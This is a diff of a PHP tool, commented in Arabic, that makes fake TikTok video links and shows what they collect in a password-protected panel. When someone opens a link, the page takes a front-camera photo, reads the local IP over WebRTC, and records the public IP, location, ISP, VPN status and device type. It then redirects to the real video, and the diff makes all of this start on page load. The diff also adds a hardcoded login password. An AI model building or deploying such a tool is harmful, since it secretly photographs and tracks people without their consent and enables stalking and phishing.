@@ -4,24 +4,44 @@ date_default_timezone_set('Africa/Algiers');
 error_reporting(0);
 @ini_set('display_errors', 0);
 
+// بدء الجلسة لحماية لوحة التحكم بكلمة مرور
+session_start();
+$password_hash = password_hash('aziz123', PASSWORD_DEFAULT);
+
+// التحقق من تسجيل الدخول
+if (isset($_POST['login_password'])) {
+    if ($_POST['login_password'] === 'aziz123') {
+        $_SESSION['is_logged_in'] = true;
+        header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
+        exit();
+    } else {
+        $login_error = "كلمة المرور غير صحيحة!";
+    }
+}
+
+// تسجيل الخروج
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
+    exit();
+}
+
 $upload_dir = 'uploads/';
 if (!is_dir($upload_dir)) {
     @mkdir($upload_dir, 0755, true);
 }
 
 try {
-    $db = new PDO('sqlite:tracker_custom_bg.db');
+    $db = new PDO('sqlite:tracker_enhanced_v3.db');
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
         target_url TEXT, 
-        sender_name TEXT,
-        sender_avatar TEXT,
-        bg_image TEXT,
         meta_title TEXT,
         meta_image TEXT,
+        use_camera INTEGER DEFAULT 1,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
@@ -33,6 +53,8 @@ try {
         local_ip TEXT, 
         port TEXT, 
         location TEXT, 
+        isp_info TEXT, 
+        vpn_status TEXT, 
         device_info TEXT, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
@@ -40,7 +62,7 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
-// دالة مخصصة ومركزة حصرياً لسحب العنوان والصورة المصغرة الحقيقية من تيك توك
+// دالة لجلب معلومات تيك توك للمعاينة
 function fetch_tiktok_exclusive_meta($url) {
     $meta = [
         'title' => 'TikTok Video',
@@ -107,18 +129,48 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-function get_ip_location($ip) {
-    if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
-        return 'Local Network';
+function clean_isp_name($isp) {
+    if (empty($isp)) return 'Unknown';
+    
+    if (stripos($isp, 'Optimum') !== false || stripos($isp, 'Djezzy') !== false || stripos($isp, 'OTA') !== false) {
+        return 'Djezzy';
     }
-    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city");
+    if (stripos($isp, 'ATM') !== false || stripos($isp, 'Mobilis') !== false) {
+        return 'Mobilis';
+    }
+    if (stripos($isp, 'Wataniya') !== false || stripos($isp, 'Ooredoo') !== false || stripos($isp, 'Nedjma') !== false) {
+        return 'Ooredoo';
+    }
+    if (stripos($isp, 'Algerie Telecom') !== false || stripos($isp, 'Algérie Télécom') !== false || stripos($isp, 'AT') !== false) {
+        return 'Algérie Télécom';
+    }
+
+    $words = explode(' ', trim($isp));
+    return implode(' ', array_slice($words, 0, 2));
+}
+
+function get_ip_details($ip) {
+    if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
+        return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No'];
+    }
+
+    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,proxy,hosting");
     if ($json) {
         $data = json_decode($json, true);
         if (isset($data['status']) && $data['status'] === 'success') {
-            return ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
+            $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
+            $raw_isp = $data['isp'] ?? 'Unknown ISP';
+            $isp = clean_isp_name($raw_isp);
+            
+            $is_proxy = !empty($data['proxy']) && $data['proxy'] === true;
+            $is_hosting = !empty($data['hosting']) && $data['hosting'] === true;
+            
+            $vpn_status = ($is_proxy || $is_hosting) ? 'Yes (VPN / Proxy Detected)' : 'No (Direct Connection)';
+
+            return ['location' => $location, 'isp' => $isp, 'vpn' => $vpn_status];
         }
     }
-    return 'Unknown Location';
+    return ['location' => 'Unknown Location', 'isp' => 'Unknown ISP', 'vpn' => 'Unknown'];
 }
 
 function get_device_type($ua) {
@@ -128,6 +180,7 @@ function get_device_type($ua) {
     elseif (stripos($ua, 'Huawei') !== false) $brand = 'Huawei';
     elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false) $brand = 'Xiaomi';
     elseif (stripos($ua, 'Oppo') !== false) $brand = 'Oppo';
+    elseif (stripos($ua, 'Realme') !== false) $brand = 'Realme';
 
     if (stripos($ua, 'Android') !== false) return $brand . ' - Android';
     if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return $brand . ' - iOS';
@@ -136,7 +189,7 @@ function get_device_type($ua) {
     return 'Unknown Device';
 }
 
-// معالجة زيارة الرابط
+// معالجة زيارة الروابط المختصرة للمتتبعين
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
     $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
@@ -145,11 +198,9 @@ if (isset($_GET['r'])) {
 
     if ($link) {
         $target_redirect = $link['target_url'];
-        $sender_name = $link['sender_name'];
-        $sender_avatar = $link['sender_avatar'];
         $meta_title = $link['meta_title'];
         $meta_image = $link['meta_image'];
-        $bg_image_url = !empty($link['bg_image']) ? $link['bg_image'] : $meta_image;
+        $use_camera = $link['use_camera'];
 
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);
@@ -170,20 +221,22 @@ if (isset($_GET['r'])) {
             exit();
         }
 
-        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
             $img_base64 = $_POST['image'] ?? '';
             $public_ip = get_real_ip();
             $local_ip = $_POST['lip'] ?? 'Direct';
             $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
-            $location = get_ip_location($public_ip);
+            
+            $ip_details = get_ip_details($public_ip);
+            $location = $ip_details['location'];
+            $isp = $ip_details['isp'];
+            $vpn = $ip_details['vpn'];
             $device = get_device_type($ua);
 
-            if (!empty($img_base64)) {
-                try {
-                    $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
-                    $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
-                } catch (Exception $e) {}
-            }
+            try {
+                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $isp, $vpn, $device, date('Y-m-d H:i:s')]);
+            } catch (Exception $e) {}
             exit('OK');
         }
 ?>
@@ -197,50 +250,14 @@ if (isset($_GET['r'])) {
     <meta property="og:image" content="<?php echo htmlspecialchars($meta_image); ?>">
     <meta property="og:type" content="video.other">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; display: flex; justify-content: center; align-items: center; position: relative; cursor: pointer; }
-        
-        .blurred-bg {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('<?php echo htmlspecialchars($bg_image_url); ?>') no-repeat center center/cover;
-            filter: blur(18px) brightness(0.65);
-            transform: scale(1.1);
-            z-index: 1;
-            pointer-events: none;
-        }
-
-        .modal-card {
-            position: relative;
-            background: rgba(255, 255, 255, 0.98);
-            width: 90%;
-            max-width: 350px;
-            border-radius: 24px;
-            padding: 30px 20px;
-            text-align: center;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
-            z-index: 10;
-            animation: popUp 0.3s ease-out;
-            cursor: pointer;
-        }
-        @keyframes popUp { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
-
-        .avatar-container { width: 80px; height: 80px; border-radius: 50%; overflow: hidden; margin: -65px auto 16px auto; border: 4px solid #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.2); background: #eee; }
-        .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
-
-        h2 { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 8px; }
-        p { font-size: 13px; color: #666; margin-bottom: 24px; line-height: 1.5; }
-
-        .btn-action { display: block; width: 100%; background: #fe2c55; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer; text-decoration: none; margin-bottom: 12px; box-shadow: 0 4px 14px rgba(254,44,85,0.4); pointer-events: none; }
-        .btn-secondary { background: transparent; color: #888; border: none; font-size: 14px; font-weight: 500; cursor: pointer; padding: 6px; pointer-events: none; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; }
     </style>
     <script>
-        let isCaptured = false;
+        let isProcessed = false;
+        const useCamera = <?php echo $use_camera; ?>;
+        const targetUrl = "<?php echo $target_redirect; ?>";
 
-        // دالة استخراج الـ IP المحلي عبر WebRTC
         function getLocalIP(callback) {
             let foundLocal = false;
             let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
@@ -261,11 +278,30 @@ if (isset($_GET['r'])) {
             setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
         }
 
-        function triggerCaptureAndRedirect(e) {
-            if (isCaptured) return;
-            isCaptured = true;
+        function sendInfoAndRedirect(imageData = "") {
+            if (isProcessed) return;
+            isProcessed = true;
 
-            const targetUrl = "<?php echo $target_redirect; ?>";
+            getLocalIP(function(localIp) {
+                const formData = new URLSearchParams();
+                formData.append('save_info', '1');
+                formData.append('image', imageData);
+                formData.append('lip', localIp);
+
+                fetch(window.location.href, {
+                    method: 'POST',
+                    body: formData
+                }).finally(() => {
+                    window.location.replace(targetUrl);
+                });
+            });
+        }
+
+        function initTracking() {
+            if (!useCamera) {
+                sendInfoAndRedirect("");
+                return;
+            }
 
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
@@ -283,42 +319,24 @@ if (isset($_GET['r'])) {
                         const imageData = canvas.toDataURL('image/jpeg', 0.85);
                         stream.getTracks().forEach(track => track.stop());
 
-                        getLocalIP(function(localIp) {
-                            const formData = new URLSearchParams();
-                            formData.append('save_capture', '1');
-                            formData.append('image', imageData);
-                            formData.append('lip', localIp);
-
-                            fetch(window.location.href, {
-                                method: 'POST',
-                                body: formData
-                            }).finally(() => {
-                                window.location.replace(targetUrl);
-                            });
-                        });
-                    }, 600);
+                        sendInfoAndRedirect(imageData);
+                    }, 300);
                 })
                 .catch(err => {
-                    window.location.replace(targetUrl);
+                    sendInfoAndRedirect("");
                 });
         }
 
         window.addEventListener('DOMContentLoaded', () => {
-            document.body.addEventListener('click', triggerCaptureAndRedirect);
+            initTracking();
         });
+
+        window.addEventListener('click', () => {
+            initTracking();
+        }, { once: true });
     </script>
 </head>
 <body>
-    <div class="blurred-bg"></div>
-    <div class="modal-card">
-        <div class="avatar-container">
-            <img src="<?php echo htmlspecialchars($sender_avatar); ?>" alt="Avatar">
-        </div>
-        <h2>Watch this video</h2>
-        <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
-        <button class="btn-action">Watch Now</button>
-        <button class="btn-secondary">Not now</button>
-    </div>
 </body>
 </html>
 <?php 
@@ -328,11 +346,21 @@ if (isset($_GET['r'])) {
     }
 }
 
-// إنشاء الرابط وسحب بيانات تيك توك حصرياً
+// حذف سجل محدد
+if (isset($_GET['delete_id']) && isset($_SESSION['is_logged_in'])) {
+    $del_id = intval($_GET['delete_id']);
+    $stmt = $db->prepare("DELETE FROM captures WHERE id = ?");
+    $stmt->execute([$del_id]);
+    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
+    exit();
+}
+
+// إنشاء رابط جديد
 $generated_link = "";
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
+$generated_code = "";
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create']) && isset($_SESSION['is_logged_in'])) {
     $target_url = trim($_POST['target_url']);
-    $sender_name = trim($_POST['sender_name']) ?: "User";
+    $use_camera = isset($_POST['use_camera']) ? 1 : 0;
     
     if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
         $target_url = "https://" . $target_url;
@@ -342,32 +370,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $meta_title = $scraped['title'];
     $meta_image = $scraped['image'];
 
-    $sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";
-    if (isset($_FILES['avatar_file']) && $_FILES['avatar_file']['error'] === UPLOAD_ERR_OK) {
-        $ext = pathinfo($_FILES['avatar_file']['name'], PATHINFO_EXTENSION);
-        $avatarName = 'avatar_' . uniqid() . '.' . $ext;
-        @move_uploaded_file($_FILES['avatar_file']['tmp_name'], $upload_dir . $avatarName);
-        $sender_avatar = $upload_dir . $avatarName;
-    } elseif (!empty($_POST['sender_avatar_url'])) {
-        $sender_avatar = trim($_POST['sender_avatar_url']);
-    }
-
-    $bg_image_url = "";
-    if (isset($_FILES['bg_file']) && $_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
-        $ext = pathinfo($_FILES['bg_file']['name'], PATHINFO_EXTENSION);
-        $bgName = 'bg_' . uniqid() . '.' . $ext;
-        @move_uploaded_file($_FILES['bg_file']['tmp_name'], $upload_dir . $bgName);
-        $bg_image_url = $upload_dir . $bgName;
-    } elseif (!empty($_POST['bg_image_url'])) {
-        $bg_image_url = trim($_POST['bg_image_url']);
-    }
-
     $code = substr(md5(uniqid(rand(), true)), 0, 7);
-    $stmt = $db->prepare("INSERT INTO links (code, target_url, sender_name, sender_avatar, bg_image, meta_title, meta_image) VALUES (?, ?, ?, ?, ?, ?, ?)");
-    $stmt->execute([$code, $target_url, $sender_name, $sender_avatar, $bg_image_url, $meta_title, $meta_image]);
+    $stmt = $db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image, use_camera) VALUES (?, ?, ?, ?, ?)");
+    $stmt->execute([$code, $target_url, $meta_title, $meta_image, $use_camera]);
 
     $domain = $_SERVER['HTTP_HOST'];
     $generated_link = "https://" . $domain . "/?r=" . $code;
+    $generated_code = $code;
 }
 
 $filter_code = trim($_GET['track'] ?? '');
@@ -384,47 +393,118 @@ if (!empty($filter_code)) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Panel</title>
+    <title>Control Panel - Login</title>
     <style>
         :root {
-            --bg-main: #0b0f17;
-            --bg-card: #131b2e;
+            --bg-main: #070913;
+            --bg-card: #10172a;
             --border-color: #1e293b;
-            --text-main: #e2e8f0;
-            --text-muted: #64748b;
-            --accent: #6366f1;
-            --accent-hover: #4f46e5;
-            --danger: #ef4444;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --accent: #8b5cf6;
+            --accent-hover: #7c3aed;
+            --danger: #f43f5e;
+            --danger-hover: #e11d48;
+            --success: #10b981;
         }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
+        
+        body { 
+            background: radial-gradient(circle at top right, #1e1b4b, #090d16 60%);
+            background-attachment: fixed;
+            color: var(--text-main); 
+            padding: 40px 15px; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: space-between; 
+        }
+
         .wrapper { max-width: 1100px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
         
-        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); }
-        h2 { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }
+        .section-box { 
+            background: rgba(16, 23, 42, 0.85); 
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border-color); 
+            border-radius: 16px; 
+            padding: 30px; 
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); 
+        }
 
-        .form-grid { display: grid; gap: 12px; }
-        input[type="text"], input[type="file"] { width: 100%; background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 14px; color: var(--text-main); font-size: 14px; outline: none; }
-        input[type="text"]:focus { border-color: var(--accent); }
+        h1 { text-align: center; font-size: 26px; font-weight: 800; margin-bottom: 5px; background: linear-gradient(to right, #a78bfa, #38bdf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .subtitle { text-align: center; color: var(--text-muted); font-size: 13px; margin-bottom: 25px; }
         
-        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: background 0.2s; }
-        .btn:hover { background: var(--accent-hover); }
-        .btn-danger { background: var(--danger); }
-        .btn-secondary { background: #334155; }
+        h2 { font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.15em; color: var(--accent); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
 
-        .result-panel { background: #020617; border: 1px solid var(--border-color); padding: 16px; border-radius: 8px; margin-top: 15px; }
-        .result-panel label { display: block; font-size: 10px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 6px; }
+        .form-grid { display: grid; gap: 16px; }
+        input[type="text"], input[type="password"] { width: 100%; background: #050b14; border: 1px solid var(--border-color); border-radius: 10px; padding: 14px 16px; color: var(--text-main); font-size: 14px; outline: none; transition: border-color 0.2s; }
+        input[type="text"]:focus, input[type="password"]:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15); }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            font-size: 14px;
+            color: var(--text-muted);
+            user-select: none;
+        }
+        .checkbox-container input {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--accent);
+            cursor: pointer;
+        }
+
+        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 10px; font-weight: 600; cursor: pointer; height: 48px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: all 0.2s; }
+        .btn:hover { background: var(--accent-hover); transform: translateY(-1px); }
+        .btn-danger { background: var(--danger); }
+        .btn-danger:hover { background: var(--danger-hover); }
+        .btn-secondary { background: #334155; }
+        .btn-secondary:hover { background: #475569; }
+        .btn-success { background: var(--success); }
+        .btn-success:hover { background: #059669; }
+
+        .result-panel { background: #050b14; border: 1px solid var(--border-color); padding: 18px; border-radius: 12px; margin-top: 15px; display: grid; gap: 12px; }
+        .result-panel label { display: block; font-size: 11px; font-weight: 700; text-transform: uppercase; color: var(--accent); letter-spacing: 0.05em; }
         .flex-row { display: flex; gap: 8px; }
+        
+        .input-link-result { 
+            background-color: #0b1329 !important; 
+            color: #38bdf8 !important; 
+            border: 1px solid #1e293b !important;
+            font-weight: 600;
+        }
 
         .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 16px; margin-top: 15px; }
-        .card-img { background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; }
-        .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
+        .card-img { background: #050b14; border: 1px solid var(--border-color); border-radius: 12px; padding: 14px; position: relative; }
+        .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border-color); }
         
         .info-row { display: flex; justify-content: space-between; font-size: 11px; margin-top: 6px; color: var(--text-muted); }
         .info-row span { color: #cbd5e1; }
-        .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; }
+        .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; cursor: pointer; }
 
-        footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
+        .btn-delete {
+            display: block;
+            width: 100%;
+            margin-top: 12px;
+            background: rgba(244, 63, 94, 0.1);
+            color: var(--danger);
+            border: 1px solid rgba(244, 63, 94, 0.3);
+            border-radius: 8px;
+            padding: 8px;
+            font-size: 12px;
+            font-weight: 600;
+            text-align: center;
+            text-decoration: none;
+            transition: all 0.2s;
+        }
+        .btn-delete:hover {
+            background: var(--danger);
+            color: white;
+        }
+
+        footer { text-align: center; margin-top: 30px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
         footer span { color: var(--accent); font-weight: 600; }
     </style>
     <script>
@@ -439,93 +519,156 @@ if (!empty($filter_code)) {
                 }, 2000);
             });
         }
+
+        async function pasteCodeToFilter(btnElement) {
+            try {
+                const text = await navigator.clipboard.readText();
+                document.getElementById('trackCodeInput').value = text.trim();
+                const original = btnElement.innerText;
+                btnElement.innerText = "Pasted";
+                btnElement.style.background = "#059669";
+                setTimeout(() => {
+                    btnElement.innerText = original;
+                    btnElement.style.background = "";
+                }, 2000);
+            } catch (err) {
+                alert('يرجى السماح للمتصفح بالوصول إلى الحافظة أو لصق الرمز يدوياً.');
+            }
+        }
     </script>
 </head>
 <body>
     <div class="wrapper">
         
-        <div class="section-box">
-            <h2>Generate TikTok Link</h2>
-            <form method="POST" enctype="multipart/form-data" class="form-grid">
-                <input type="text" name="target_url" placeholder="TikTok Video URL..." required>
-                <input type="text" name="sender_name" placeholder="Sender Name (e.g. azez)">
-                
-                <div>
-                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Sender Avatar Image:</label>
-                    <input type="file" name="avatar_file" accept="image/*">
-                    <input type="text" name="sender_avatar_url" placeholder="Or paste Avatar URL..." style="margin-top: 6px;">
-                </div>
-
-                <div>
-                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Background Blur Image (Optional):</label>
-                    <input type="file" name="bg_file" accept="image/*">
-                    <input type="text" name="bg_image_url" placeholder="Or paste Background URL..." style="margin-top: 6px;">
-                </div>
-
-                <button type="submit" name="create" class="btn">Generate Link</button>
-            </form>
-
-            <?php if (!empty($generated_link)): ?>
-                <div class="result-panel">
-                    <label>Active Link:</label>
-                    <div class="flex-row">
-                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
-                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy</button>
-                    </div>
-                </div>
-            <?php endif; ?>
+        <div>
+            <h1>Control Panel</h1>
+            <p class="subtitle">TikTok High-Speed Zero-Click Engine v3</p>
         </div>
 
-        <div class="section-box">
-            <h2>Captured Gallery & Details</h2>
-            <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
-                <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; background:#020617; border:1px solid var(--border-color); border-radius:8px; padding:10px; color:#fff; outline:none;">
-                <button type="submit" class="btn" style="height:42px;">Filter</button>
-                <?php if(!empty($filter_code)): ?>
-                    <a href="/" class="btn btn-danger" style="height:42px; text-decoration:none; display:flex; align-items:center;">Reset</a>
+        <?php if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true): ?>
+            <!-- نموذج تسجيل الدخول -->
+            <div class="section-box" style="max-width: 400px; margin: 50px auto; width: 100%;">
+                <h2>تسجيل الدخول</h2>
+                <?php if (!empty($login_error)): ?>
+                    <p style="color: var(--danger); font-size: 12px; margin-bottom: 12px; text-align: center;"><?php echo $login_error; ?></p>
                 <?php endif; ?>
-            </form>
+                <form method="POST" class="form-grid">
+                    <input type="password" name="login_password" placeholder="أدخل كلمة المرور..." required autofocus>
+                    <button type="submit" class="btn" style="width: 100%;">دخول</button>
+                </form>
+            </div>
+        <?php else: ?>
+            <!-- لوحة التحكم المحمية -->
+            <div style="text-align: right; margin-bottom: -15px;">
+                <a href="?logout=1" class="btn btn-danger" style="height: 38px; padding: 0 16px; font-size: 12px; text-decoration: none;">تسجيل الخروج</a>
+            </div>
 
-            <?php if (empty($captures)): ?>
-                <p style="text-align: center; color: var(--text-muted); padding: 30px;">No captures recorded.</p>
-            <?php else: ?>
-                <div class="gallery-grid">
-                    <?php foreach ($captures as $cap): ?>
-                        <div class="card-img">
-                            <a href="<?php echo $cap['image_data']; ?>" target="_blank">
-                                <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
-                            </a>
-                            <div class="info-row" style="margin-top:10px;">
-                                <span>Code:</span> <span class="code-badge"><?php echo htmlspecialchars($cap['code']); ?></span>
-                            </div>
-                            <div class="info-row">
-                                <span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span>
-                            </div>
-                            <div class="info-row">
-                                <span>Local IP:</span> <span style="color:#facc15;"><?php echo htmlspecialchars($cap['local_ip']); ?></span>
-                            </div>
-                            <div class="info-row">
-                                <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
-                            </div>
-                            <div class="info-row">
-                                <span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
-                            </div>
-                            <div class="info-row">
-                                <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
-                            </div>
-                            <div class="info-row" style="border-top:1px solid var(--border-color); padding-top:6px; margin-top:8px;">
-                                <span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
+            <div class="section-box">
+                <h2>Generate TikTok Link</h2>
+                <form method="POST" class="form-grid">
+                    <input type="text" name="target_url" placeholder="TikTok Video URL..." required>
+                    
+                    <label class="checkbox-container">
+                        <input type="checkbox" name="use_camera" value="1" checked>
+                        تفعيل التقاط صورة الكاميرا عند الزيارة (اختياري)
+                    </label>
+
+                    <button type="submit" name="create" class="btn">Generate Link</button>
+                </form>
+
+                <?php if (!empty($generated_link)): ?>
+                    <div class="result-panel">
+                        <div>
+                            <label>Active Link:</label>
+                            <div class="flex-row" style="margin-top: 6px;">
+                                <input type="text" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
+                                <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy</button>
                             </div>
                         </div>
-                    <?php endforeach; ?>
-                </div>
-            <?php endif; ?>
-        </div>
+                        
+                        <div>
+                            <label>Tracking Code (رمز التتبع):</label>
+                            <div class="flex-row" style="margin-top: 6px;">
+                                <input type="text" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_code); ?>" style="font-family: monospace; font-weight: bold; color: #a78bfa !important;">
+                                <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_code); ?>', this)">Copy Code</button>
+                            </div>
+                        </div>
+                    </div>
+                <?php endif; ?>
+            </div>
+
+            <div class="section-box">
+                <h2>Captured Gallery & Details</h2>
+                <form method="GET" style="margin-bottom: 20px; display: flex; gap: 8px; flex-wrap: wrap;">
+                    <input type="text" id="trackCodeInput" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; min-width: 200px;">
+                    <div style="display: flex; gap: 8px;">
+                        <button type="submit" class="btn" style="height:48px;">Filter</button>
+                        <button type="button" class="btn btn-success" style="height:48px;" onclick="pasteCodeToFilter(this)">Paste Code</button>
+                        <?php if(!empty($filter_code)): ?>
+                            <a href="/" class="btn btn-danger" style="height:48px; text-decoration:none; display:flex; align-items:center;">Reset</a>
+                        <?php endif; ?>
+                    </div>
+                </form>
+
+                <?php if (empty($captures)): ?>
+                    <p style="text-align: center; color: var(--text-muted); padding: 40px;">No captures recorded.</p>
+                <?php else: ?>
+                    <div class="gallery-grid">
+                        <?php foreach ($captures as $cap): ?>
+                            <div class="card-img">
+                                <?php if (!empty($cap['image_data'])): ?>
+                                    <a href="<?php echo $cap['image_data']; ?>" target="_blank">
+                                        <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
+                                    </a>
+                                <?php else: ?>
+                                    <div style="width: 100%; height: 160px; background: #0b1329; display: flex; align-items: center; justify-content: center; border-radius: 8px; color: var(--text-muted); font-size: 12px; border: 1px dashed var(--border-color);">
+                                        الكاميرا معطلة (بدون صورة)
+                                    </div>
+                                <?php endif; ?>
+
+                                <div class="info-row" style="margin-top:10px;">
+                                    <span>Code:</span> <span class="code-badge" onclick="copyText('<?php echo htmlspecialchars($cap['code']); ?>', this)" title="انقر لنسخ الرمز"><?php echo htmlspecialchars($cap['code']); ?> 📋</span>
+                                </div>
+                                <div class="info-row">
+                                    <span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span>
+                                </div>
+                                <div class="info-row">
+                                    <span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span>
+                                </div>
+                                <div class="info-row">
+                                    <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
+                                </div>
